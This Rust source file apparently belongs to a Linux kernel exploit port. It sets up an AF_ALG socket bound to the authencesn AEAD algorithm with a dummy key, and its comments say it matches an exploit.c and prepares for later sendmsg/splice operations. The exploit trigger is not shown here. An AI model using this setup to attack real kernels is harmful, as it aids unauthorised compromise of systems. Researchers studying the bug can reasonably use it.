use crate::syscall::{close_fd, last};
use crate::Error;
use core::mem;
use core::ptr;

const SOL_ALG: i32 = 279;
const ALG_SET_KEY: i32 = 1;
const ALG_SET_AEAD_AUTHSIZE: i32 = 5;
const SALG_TYPE_AEAD: &[u8] = b"aead\0";
const SALG_NAME_AUTHENCESN: &[u8] = b"authencesn(hmac(sha256),cbc(aes))\0";

pub const AUTHSIZE: u32 = 4;
pub const IV_LEN: u32 = 16;
pub const AAD_LEN: u32 = 8;

// authencesn key layout (kernel crypto_authenc_extractkeys):
//   rtattr { u16 rta_len=8 (LE); u16 rta_type=1 (LE, CRYPTO_AUTHENC_KEYA_PARAM) }
//   __be32 enckeylen = 16  (BE -> bytes 00 00 00 10; selects AES-128)
//   auth_key[16] (HMAC-SHA256 truncated key) + enc_key[16] (AES-128 key)
// Values are irrelevant; setkey only needs to succeed so subsequent
// sendmsg/splice ops are accepted. Matches tgies/copy-fail-c exploit.c.
pub const AUTHENC_KEY: [u8; 40] = [
    0x08, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x10, b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
    b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
    b'A', b'A', b'A', b'A', b'A', b'A', b'A', b'A',
];

pub struct AlgSocket {
    pub ctrl_fd: i32,
    pub op_fd: i32,
}

impl AlgSocket {
    pub fn new_authencesn() -> Result<Self, Error> {
        unsafe {
            let ctrl_fd = libc::socket(libc::AF_ALG, libc::SOCK_SEQPACKET, 0);
            if ctrl_fd < 0 {
                return Err(last());
            }

            let mut sa: libc::sockaddr_alg = mem::zeroed();
            sa.salg_family = libc::AF_ALG as u16;
            for (i, b) in SALG_TYPE_AEAD.iter().enumerate() {
                if i >= sa.salg_type.len() {
                    break;
                }
                sa.salg_type[i] = *b;
            }
            for (i, b) in SALG_NAME_AUTHENCESN.iter().enumerate() {
                if i >= sa.salg_name.len() {
                    break;
                }
                sa.salg_name[i] = *b;
            }

            if libc::bind(
                ctrl_fd,
                &sa as *const _ as *const libc::sockaddr,
                mem::size_of::<libc::sockaddr_alg>() as libc::socklen_t,
            ) < 0
            {
                let e = last();
                close_fd(ctrl_fd);
                return Err(
                    if matches!(
                        e,
                        Error::Syscall(libc::ENOENT) | Error::Syscall(libc::EAFNOSUPPORT)
                    ) {
                        Error::AlgUnavailable
                    } else {
                        e
                    },
                );
            }

            if libc::setsockopt(
                ctrl_fd,
                SOL_ALG,
                ALG_SET_KEY,
                AUTHENC_KEY.as_ptr() as *const _,
                AUTHENC_KEY.len() as libc::socklen_t,
            ) < 0
            {
                let e = last();
                close_fd(ctrl_fd);
                return Err(e);
            }

            if libc::setsockopt(
                ctrl_fd,
                SOL_ALG,
                ALG_SET_AEAD_AUTHSIZE,
                ptr::null(),
                AUTHSIZE,
            ) < 0
            {
                let e = last();
                close_fd(ctrl_fd);
                return Err(e);
            }

            let op_fd = libc::accept(ctrl_fd, ptr::null_mut(), ptr::null_mut());
            if op_fd < 0 {
                let e = last();
                close_fd(ctrl_fd);
                return Err(e);
            }

            Ok(AlgSocket { ctrl_fd, op_fd })
        }
    }
}

impl Drop for AlgSocket {
    fn drop(&mut self) {
        unsafe {
            close_fd(self.op_fd);
            close_fd(self.ctrl_fd);
        }
    }
}
